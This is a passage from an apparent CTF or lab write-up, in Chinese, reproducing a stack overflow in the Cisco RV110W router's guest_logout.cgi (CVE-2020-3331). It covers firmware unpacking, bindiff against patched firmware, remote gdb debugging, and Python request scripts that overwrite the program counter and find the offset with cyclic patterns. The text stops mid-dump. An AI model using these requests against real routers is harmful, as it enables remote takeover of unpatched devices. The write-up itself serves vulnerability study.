<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~$ curl -v http://192.168.1.1</span><br><span class="line">* Rebuilt URL to: http://192.168.1.1/</span><br><span class="line">*   Trying 192.168.1.1...</span><br><span class="line">* Connected to 192.168.1.1 (192.168.1.1) port 80 (<span class="comment">#0)</span></span><br><span class="line">&gt; GET / HTTP/1.1</span><br><span class="line">&gt; Host: 192.168.1.1</span><br><span class="line">&gt; User-Agent: curl/7.47.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">&lt; HTTP/1.1 302 Redirect</span><br><span class="line">&lt; Server: httpd</span><br><span class="line">&lt; Date: Fri, 01 Jan 2010 15:17:12 GMT</span><br><span class="line">&lt; Location: https://192.168.1.1</span><br><span class="line">&lt; Content-Type: text/plain</span><br><span class="line">&lt; Connection: close</span><br><span class="line">&lt; </span><br><span class="line">* Closing connection 0</span><br></pre></td></tr></table></figure>

<h3 id="固件提取与解包"><a href="#固件提取与解包" class="headerlink" title="固件提取与解包"></a>固件提取与解包</h3><p>赛题已经给出了特定版本的固件，无需特别进行提取操作，但还需要进行固件解包以得到设备的程序文件，在解包前，需要配置必须的环境</p>
<p>首先安装binwalk，binwalk可对设备固件进行文件格式的分析</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install binwalk</span><br></pre></td></tr></table></figure>

<p>对于目标固件，还需要安装<code>sasquatch</code>这一组件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/devttys0/sasquatch</span><br><span class="line"><span class="built_in">cd</span> sasquatch </span><br><span class="line">./build.sh</span><br></pre></td></tr></table></figure>

<p>此时使用binwalk还是会错误，还需要进行一些操作</p>
<ul>
<li>进入squashfs-tools文件夹,位于下载的sasquatch文件夹内，很容易找到</li>
<li>编辑Makefile文件，注释掉XZ_SUPPORT = 1行</li>
<li>执行<code>sudo make &amp;&amp; sudo make instal</code></li>
</ul>
<p>此后再执行以下命令即可解压出完整文件系统</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me RV110W_FW_1.2.2.5.bin</span><br></pre></td></tr></table></figure>

<p>如下图所示</p>
<img src="/2020/11/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%80%9D%E7%A7%91%E8%B7%AF%E7%94%B1%E5%99%A8RV110W/image-20201130223158149.png" alt="image-20201130223158149" style="zoom:50%;">

<img src="/2020/11/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%80%9D%E7%A7%91%E8%B7%AF%E7%94%B1%E5%99%A8RV110W/image-20201130223337112.png" alt="image-20201130223337112" style="zoom:50%;">


<p>查看文件，确认目标平台为：MIPS 32位 小端</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file sbin/rc</span><br><span class="line">sbin/rc: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br></pre></td></tr></table></figure>

<h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><p>可以尝试在网上搜索关于该设备的漏洞，最基本的方法是在CVE官网上搜索设备相关信息，找到部分前台漏洞如下：</p>
<table>
<thead>
<tr>
<th>CVE编号</th>
<th>漏洞详情</th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-3331">CVE-2020-3331</a></td>
<td>由于基于Web的管理界面未正确验证用户提供的输入数据而引起的前台RCE</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-3330">CVE-2020-3330</a></td>
<td>Telnet服务漏洞，可获取系统账户具有的默认静态密码</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-3323">CVE-2020-3323</a></td>
<td>同为前台RCE</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-3150">CVE-2020-3150</a></td>
<td>要求有经过认证的用户登录过的文件下载</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-3144">CVE-2020-3144</a></td>
<td>绕过前台认证，到后台执行命令</td>
</tr>
</tbody></table>
<h4 id="CVE-2020-3330"><a href="#CVE-2020-3330" class="headerlink" title="CVE-2020-3330"></a>CVE-2020-3330</h4><p>该漏洞为telnet服务的漏洞，可以在固件内找到管理员用户以及对应的密码hash值，<a target="_blank" rel="noopener" href="https://blogs.360.cn/post/yi-ge-zi-jie-cha-cuo-dao-zhi-Cisco-fang-huo-qiang-lu-you-qi-yuan-cheng-dai-ma-zhi-xing.html">一篇分析该漏洞的文章</a></p>
<h3 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>确定目标为CVE-2020-3331和CVE-2020-3323，因为都是Web前台RCE，且目标只开放了443端口(80端口被重定向)，所以要先找到Web对应的二进制程序</p>
<h4 id="固件搜索"><a href="#固件搜索" class="headerlink" title="固件搜索"></a>固件搜索</h4><p>全局搜索登陆界面名称<code>login.cgi</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~$ grep -Rn <span class="string">&quot;login.cgi&quot;</span> * 2&gt;/dev/null</span><br><span class="line">匹配到二进制文件 iot/rv110w/_RV110W_FW_1.2.2.5.bin.extracted/squashfs-root/usr/sbin/httpd</span><br><span class="line">iot/rv110w/_RV110W_FW_1.2.2.5.bin.extracted/squashfs-root/www/login.asp:453:&lt;FORM id=frm name=login method=&lt;% get_http_method(); %&gt; action=<span class="string">&quot;login.cgi&quot;</span> onKeyDown=chk_keypress(event) autocomplete=off&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到二进制文件<code>usr/sbin/httpd</code>应该是Web程序</p>
<h4 id="端口分析"><a href="#端口分析" class="headerlink" title="端口分析"></a>端口分析</h4><p>设备自带的netstat无法查看端口对应的进程号，所以下载busybox，上传到路由器内（注意在实机调试中实际上不能直接使用这一方法，因为上传文件首先需要admin用户，这里是通过另一个漏洞获取的，所以可以直接用telnet上传文件，通常需要实机拆解调试，这里为方便处理使用了这种方法）</p>
<p>在本机开启web服务，在虚拟机开启的话操作会更麻烦，这里是在windows环境下开启的，注意将下载好的busybox放到某文件夹内后需在同一目录开启</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\ctf\Iot\rw110w&gt;python -m SimpleHTTPServer</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure>

<p>用telnet管理员用户登陆路由器，在<code>/tmp</code>目录内用wget下载</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~$ telnet 192.168.1.1</span><br><span class="line">Trying 192.168.1.1...</span><br><span class="line">Connected to 192.168.1.1.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">RV110W login: admin</span><br><span class="line">Password: </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BusyBox v1.7.2 (2019-04-22 16:08:01 CST) built-in shell (ash)</span><br><span class="line">Enter <span class="string">&#x27;help&#x27;</span> <span class="keyword">for</span> a list of built-in commands.</span><br><span class="line">$ <span class="built_in">cd</span> /tmp</span><br><span class="line">$ wget http://192.168.1.100:8000/busybox-mipsel</span><br><span class="line">Connecting to 192.168.1.100:8000 (192.168.1.100:8000)</span><br><span class="line">busybox-mipsel       100% |*******************************|  1539k 00:00:00 ETA</span><br></pre></td></tr></table></figure>

<p>注意下载好后的文件可能没有执行权限，用<code>chmod</code>授予，用该</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># chmod +x busybox-mipsel</span></span><br><span class="line"><span class="comment"># ./busybox-mipsel netstat -pantu | grep 443</span></span><br><span class="line">tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      356/httpd</span><br><span class="line">tcp        0      0 :::443                  :::*                    LISTEN      356/httpd</span><br></pre></td></tr></table></figure>

<p>可以看到进程号对应httpd。</p>
<p>此后的调试还需要上传gdbserver，方法相同</p>
<h4 id="目标分析"><a href="#目标分析" class="headerlink" title="目标分析"></a>目标分析</h4><p>查看文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/iot/rv110w/_RV110W_FW_1.2.2.5.bin.extracted/squashfs-root/usr/sbin$ file httpd</span><br><span class="line">httpd: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class="line">ssr@ubuntu:~/iot/rv110w/_RV110W_FW_1.2.2.5.bin.extracted/squashfs-root/usr/sbin$ checksec httpd</span><br><span class="line">    Arch:     mips-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<p>可以看到基本没开保护</p>
<p>但是直接反汇编分析还是比较复杂，因为新版本固件修复了以上漏洞，不妨对比查看</p>
<h5 id="固件对比"><a href="#固件对比" class="headerlink" title="固件对比"></a>固件对比</h5><p>下载新版1.2.2.8固件，同样用binwalk解包，对比httpd程序，这里就要使用IDA的bindiff插件，注意官网下载需要科学上网，安装时要指定IDA目录，我安装时初次是用4.30版本，不适用于7.x版本的ida，用5版本的bindiff即可。</p>
<p>在IDA的File菜单中可使用这一工具，在保存了两个文件的idb情况下，打开一个文件后用该工具选中另一个文件的idb，即可对比查看，可以在Matched Functions界面看到如下图所示</p>
<p><img src="/2020/11/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%80%9D%E7%A7%91%E8%B7%AF%E7%94%B1%E5%99%A8RV110W/image-20201202090906028.png" alt="image-20201202090906028"></p>
<p>颜色越红的函数越不匹配。考虑到目标是获取前台的get_shell，所以guest_logout_cgi比较可疑，右键该函数选择<code>View flow graphs</code>功能即可进入bindiff对比查看</p>
<p>可以看到一个危险函数<code>sscanf</code></p>
<p><img src="/2020/11/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%80%9D%E7%A7%91%E8%B7%AF%E7%94%B1%E5%99%A8RV110W/image-20201202091919843.png" alt="image-20201202091919843"></p>
<p>测试访问guest_logout.cgi，发现是可以访问的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~$ curl -k -v https://192.168.1.1/guest_logout.cgi</span><br><span class="line">*   Trying 192.168.1.1...</span><br><span class="line">* Connected to 192.168.1.1 (192.168.1.1) port 443 (<span class="comment">#0)</span></span><br><span class="line">* found 138 certificates <span class="keyword">in</span> /etc/ssl/certs/ca-certificates.crt</span><br><span class="line">* found 557 certificates <span class="keyword">in</span> /etc/ssl/certs</span><br><span class="line">* ALPN, offering http/1.1</span><br><span class="line">* SSL connection using TLS1.2 / RSA_AES_128_GCM_SHA256</span><br><span class="line">* 	 server certificate verification SKIPPED</span><br><span class="line">* 	 server certificate status verification SKIPPED</span><br><span class="line">* 	 common name: BC:67:1C:41:F8:06 (does not match <span class="string">&#x27;192.168.1.1&#x27;</span>)</span><br><span class="line">* 	 server certificate expiration date OK</span><br><span class="line">* 	 server certificate activation date OK</span><br><span class="line">* 	 certificate public key: RSA</span><br><span class="line">* 	 certificate version: <span class="comment">#3</span></span><br><span class="line">* 	 subject: O=Cisco Systems\, Inc.,OU=Cisco,CN=BC:67:1C:41:F8:06,serialNumber=PID:RV110W-E SN:CCQ20311409</span><br><span class="line">* 	 start date: Thu, 09 Oct 2014 09:15:25 GMT</span><br><span class="line">* 	 expire date: Sun, 06 Oct 2024 09:15:25 GMT</span><br><span class="line">* 	 issuer: O=Cisco Systems\, Inc.,OU=Cisco,CN=BC:67:1C:41:F8:06,serialNumber=PID:RV110W-E SN:CCQ20311409</span><br><span class="line">* 	 compression: NULL</span><br><span class="line">* ALPN, server did not agree to a protocol</span><br><span class="line">&gt; GET /guest_logout.cgi HTTP/1.1</span><br><span class="line">&gt; Host: 192.168.1.1</span><br><span class="line">&gt; User-Agent: curl/7.47.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">&lt; HTTP/1.1 200 Ok</span><br><span class="line">&lt; Server: httpd</span><br><span class="line">&lt; Date: Fri, 01 Jan 2010 03:20:09 GMT</span><br><span class="line">&lt; Cache-Control: no-cache</span><br><span class="line">&lt; Pragma: no-cache</span><br><span class="line">&lt; Expires: 0</span><br><span class="line">&lt; Content-Type: text/html</span><br><span class="line">&lt; Connection: close</span><br><span class="line">&lt; </span><br><span class="line">* Closing connection 0</span><br></pre></td></tr></table></figure>

<p>用IDA查看1.2.2.5版本固件的guest_logout_cgi伪码，找到sscanf函数部分如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">v5 = (<span class="keyword">const</span> <span class="keyword">char</span> *)get_cgi((<span class="keyword">char</span> *)&amp;unk_480000 + <span class="number">0x19B0</span>);</span><br><span class="line">v10 = (<span class="keyword">const</span> <span class="keyword">char</span> *)get_cgi(<span class="string">&quot;cip&quot;</span>);</span><br><span class="line">v11 = (<span class="keyword">const</span> <span class="keyword">char</span> *)get_cgi(<span class="string">&quot;submit_button&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !v11 )</span><br><span class="line">  v11 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> ( v5 &amp;&amp; v10 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( VERIFY_MAC_17(v5) &amp;&amp; VERIFY_IPv4(v10) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(v11, <span class="string">&quot;status_guestnet.asp&quot;</span>) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">    <span class="built_in">sscanf</span>(v11, <span class="string">&quot;%[^;];%*[^=]=%[^\n]&quot;</span>, v29, v28);</span><br></pre></td></tr></table></figure>

<p>sscanf为栈溢出，<code>%[^;];%*[^=]=%[^\n]</code>中，%表示选择，%*表示过滤，三个中括号表示类似正则的字符集，意思分别为：</p>
<ul>
<li><code>%[^;]</code>：分号前所有的字符</li>
<li><code>;%*[^=]</code>：分号后，等号前的字符都不要</li>
<li><code>=%[^\n]</code>：等号后，换行符前的所有字符</li>
</ul>
<p>v5未被正确识别，找到<code>0x004819B0</code>处，为<code>.rodata:004819B0 aCmac:  .ascii &quot;cmac&quot;&lt;0&gt;</code></p>
<p>分析到达sscanf所需的条件：</p>
<ul>
<li>cmac：mac地址格式</li>
<li>cip：ip地址格式</li>
<li>submit_button：包含status_guestnet.asp</li>
</ul>
<h4 id="用requests发包测试该程序"><a href="#用requests发包测试该程序" class="headerlink" title="用requests发包测试该程序"></a>用requests发包测试该程序</h4><h4 id="调试程序"><a href="#调试程序" class="headerlink" title="调试程序"></a>调试程序</h4><p>下载对应版本的gdbserver，用之前的方法上传到路由器，挂载到httpd对应的356进程上</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://192.168.1.100:8000/gdbserver</span><br><span class="line">./gdbserver :1234 --attach 356</span><br><span class="line">Attached; pid = 356</span><br><span class="line">Listening on port 1234</span><br></pre></td></tr></table></figure>

<p>然后启用<code>gdb-multiarch</code>开始远程调试</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/iot/rv110w/_RV110W_FW_1.2.2.5.bin.extracted/squashfs-root/usr/sbin$ gdb-multiarch -q httpd</span><br><span class="line">pwndbg: loaded 190 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">Reading symbols from httpd...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">gdb-peda$ <span class="built_in">set</span> architecture mips</span><br><span class="line">The target architecture is assumed to be mips</span><br><span class="line">gdb-peda$ <span class="built_in">set</span> endian little</span><br><span class="line">The target is assumed to be little endian</span><br><span class="line">gdb-peda$ target remote 192.168.1.1:1234</span><br></pre></td></tr></table></figure>

<p>然后发送之前测试用的报文：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://192.168.1.1/guest_logout.cgi&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,<span class="string">&quot;submit_button&quot;</span>:<span class="string">&quot;status_guestnet.asp&quot;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span>,<span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.1.100&quot;</span>&#125;</span><br><span class="line"><span class="comment">#requests.get(url, data=payload, verify=False, timeout=1)</span></span><br><span class="line">requests.post(url, data=payload, verify=<span class="literal">False</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>此时可在<code>gdb-multiarch</code>终端看到</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">0x61616161 <span class="keyword">in</span> ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line">*V0   0x0</span><br><span class="line">*V1   0x73</span><br><span class="line">*A0   0x4d81f2 (post_buf+66) ◂— <span class="string">&#x27;tatus_guestnet.aspaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span></span><br><span class="line">*A1   0x47f785 ◂— <span class="string">&#x27;ogin_guest.asp&#x27;</span></span><br><span class="line">*A2   0x168</span><br><span class="line">*A3   0x4fa608 ◂— 0x0</span><br><span class="line">*T0   0x4fa5b0 ◂— 0x0</span><br><span class="line">*T1   0x4fa5b0 ◂— 0x0</span><br><span class="line">*T2   0x111</span><br><span class="line">*T3   0xfffffff0</span><br><span class="line">*T4   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*T5   0x2b030004 (__ctype_b) —▸ 0x2afeabc0 (__C_ctype_b_data+256) ◂— 0x2000200</span><br><span class="line">*T6   0xca5fb1e</span><br><span class="line">*T7   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*T8   0x1</span><br><span class="line">*T9   0x2afc64d0 (strcoll) ◂— lbu    <span class="variable">$v1</span>, (<span class="variable">$a0</span>)</span><br><span class="line">*S0   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S1   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S2   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S3   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S4   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S5   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S6   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S7   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S8   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*FP   0x7fce1458 ◂— <span class="string">&#x27;aaaaaaaaaaa&#x27;</span></span><br><span class="line">*SP   0x7fce1458 ◂— <span class="string">&#x27;aaaaaaaaaaa&#x27;</span></span><br><span class="line">*PC   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">Invalid address 0x61616161</span><br><span class="line"></span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ fp sp  0x7fce1458 ◂— <span class="string">&#x27;aaaaaaaaaaa&#x27;</span></span><br><span class="line">... ↓</span><br><span class="line">02:0008│        0x7fce1460 ◂— 0x616161 /* <span class="string">&#x27;aaa&#x27;</span> */</span><br><span class="line">03:000c│        0x7fce1464 ◂— 0x0</span><br><span class="line">04:0010│        0x7fce1468 —▸ 0x7fce1bc8 ◂— <span class="string">&#x27;guest_logout.cgi&#x27;</span></span><br><span class="line">... ↓</span><br><span class="line">06:0018│        0x7fce1470 —▸ 0x4d81b0 (post_buf) ◂— <span class="string">&#x27;cmac&#x27;</span></span><br><span class="line">07:001c│        0x7fce1474 ◂— 0x0</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f 0 61616161</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure>

<p>可以看到寄存器被控制，可以利用该漏洞</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="确认溢出长度"><a href="#确认溢出长度" class="headerlink" title="确认溢出长度"></a>确认溢出长度</h4><p>用<code>pwntools</code>的<code>cyclic</code>进行发包测试，脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://192.168.1.1/guest_logout.cgi&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,<span class="string">&quot;submit_button&quot;</span>:<span class="string">&quot;status_guestnet.asp&quot;</span>+cyclic(<span class="number">100</span>),<span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.1.100&quot;</span>&#125;</span><br><span class="line">requests.post(url, data=payload, verify=<span class="literal">False</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>得到gdb寄存器值如下，可以看到pc对应<code>aaaw</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line">*V0   0x0</span><br><span class="line">*V1   0x73</span><br><span class="line">*A0   0x4d81f2 (post_buf+66) ◂— <span class="string">&#x27;tatus_guestnet.aspaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#x27;</span></span><br><span class="line">*A1   0x47f785 ◂— <span class="string">&#x27;ogin_guest.asp&#x27;</span></span><br><span class="line">*A2   0x68</span><br><span class="line">*A3   0x4fa3d8 ◂— 0x0</span><br><span class="line">*T0   0x4fa380 ◂— 0xa9958270</span><br><span class="line">*T1   0x4fa380 ◂— 0xa9958270</span><br><span class="line">*T2   0x11</span><br><span class="line">*T3   0xfffffff0</span><br><span class="line">*T4   0x61617361 (<span class="string">&#x27;asaa&#x27;</span>)</span><br><span class="line">*T5   0x2b030004 (__ctype_b) —▸ 0x2afeabc0 (__C_ctype_b_data+256) ◂— 0x2000200</span><br><span class="line">*T6   0xca5fb1e</span><br><span class="line">*T7   0x61617461 (<span class="string">&#x27;ataa&#x27;</span>)</span><br><span class="line">*T8   0x3</span><br><span class="line">*T9   0x2afc64d0 (strcoll) ◂— lbu    <span class="variable">$v1</span>, (<span class="variable">$a0</span>)</span><br><span class="line">*S0   0x6e616161 (<span class="string">&#x27;aaan&#x27;</span>)</span><br><span class="line">*S1   0x6f616161 (<span class="string">&#x27;aaao&#x27;</span>)</span><br><span class="line">*S2   0x70616161 (<span class="string">&#x27;aaap&#x27;</span>)</span><br><span class="line">*S3   0x71616161 (<span class="string">&#x27;aaaq&#x27;</span>)</span><br><span class="line">*S4   0x72616161 (<span class="string">&#x27;aaar&#x27;</span>)</span><br><span class="line">*S5   0x73616161 (<span class="string">&#x27;aaas&#x27;</span>)</span><br><span class="line">*S6   0x74616161 (<span class="string">&#x27;aaat&#x27;</span>)</span><br><span class="line">*S7   